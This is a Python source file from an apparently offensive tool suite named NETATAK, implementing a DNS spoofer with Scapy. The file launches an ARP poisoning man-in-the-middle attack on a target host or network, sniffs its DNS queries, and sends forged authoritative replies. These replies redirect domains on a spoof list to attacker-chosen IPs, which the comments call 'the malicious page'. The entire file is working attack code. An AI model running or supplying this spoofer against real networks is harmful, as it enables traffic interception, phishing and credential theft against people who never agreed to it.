"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# DNS Spoofer
# This tool will start by conducting an ARP MITM against the target machine/network
# It will then attempt to intercept and inspect the DNS queries from the target/network
# If the target is attempting to access a site that is in the spoof list, the packet will be modified and
# returned to the target, sending them to the malicious page. Otherwise, the target will be forwarded to
# the legitimate location.
# THe spoof list can be found int atktools/config/spooflist

import csv
from scapy.all import *
from atktools import arp_mitm

# Define text colours
B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m', '\033[0m'

# Define the class
class dnspoof:
    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1):
        # netscanner/MITM variables
        self.target = target  # Target machine/network
        self.rtrip = rtrip  # Default gateway for the network
        self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
        self.timeout = timeout  # Response timeout value
        self.pktintr = float(pktintr)  # Interval between packets

        # Config file - open it using the CSV module and keep it open until the script is closed
        self.dnspoof_config = os.path.dirname(__file__) + "/config/dnspoof/spooflist.csv"

        # Other variables
        self.rdata_ip = ""  # Variable to hold spoof IP

    def parse_pkt(self, pkt):
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            pkt_dst = pkt[DNS].qd.qname
            pkt_dst = pkt_dst.decode("utf-8")
            print("{0}[*] Intercepted DNS query from {1} attempting to locate {2}".format(Y, pkt[IP].src, pkt_dst))
            self.rdata_ip = ""  # Ensure any spoof IPs are cleared out
            with open(self.dnspoof_config, 'r') as conf_reader:
                conf_obj = csv.reader(conf_reader, delimiter=",")
                for row in conf_obj:
                    if row[0] in pkt_dst:
                        self.rdata_ip = row[1]
                        pkt_response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.rdata_ip))
                        send(pkt_response, verbose=1)
                        print("{0}[*] Spoofed DNS response sent. {1} has been sent to {2} for {3}".format(G, pkt[IP].src, self.rdata_ip, pkt_dst))
                        break

    def sniff_packets(self):
        # Use Scapys sniff feature to sniff out any DNS requests from the target machine/network
        sniff_filter = "udp and port 53 and ip src %s" % self.target
        sniff(filter=sniff_filter, prn=self.parse_pkt)

    def start_spoofer(self):
        try:
            print("{0}[*] NETATAK is starting ARP poisoning against {1}. Going to sleep for 15 seconds whilst this operation completes...".format(B, self.target))
            arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr)
            arp_thread = threading.Thread(target=arp_start.find_targets, daemon=True)
            arp_thread.start()
            time.sleep(15)
            spoof_thread = threading.Thread(target=self.sniff_packets, daemon=True)
            spoof_thread.start()
            print("{0}[*] NETATAK is now spoofing responses to DNS queries for {1}. Press CTRL+C to stop spoofing DNS responses and ARP poisoning.".format(B, self.target))
            while True:
                time.sleep(1)
        except (KeyboardInterrupt):
            print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
            stop_arp = arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr)
            stop_arp.find_targets()
        except:
            print("{0}[*] NETATAK encountered an unexpected error whilst trying to conduct DNS spoofing. The error is: {1}.".format(R, sys.exc_info()[0]))
            print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
            arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr)
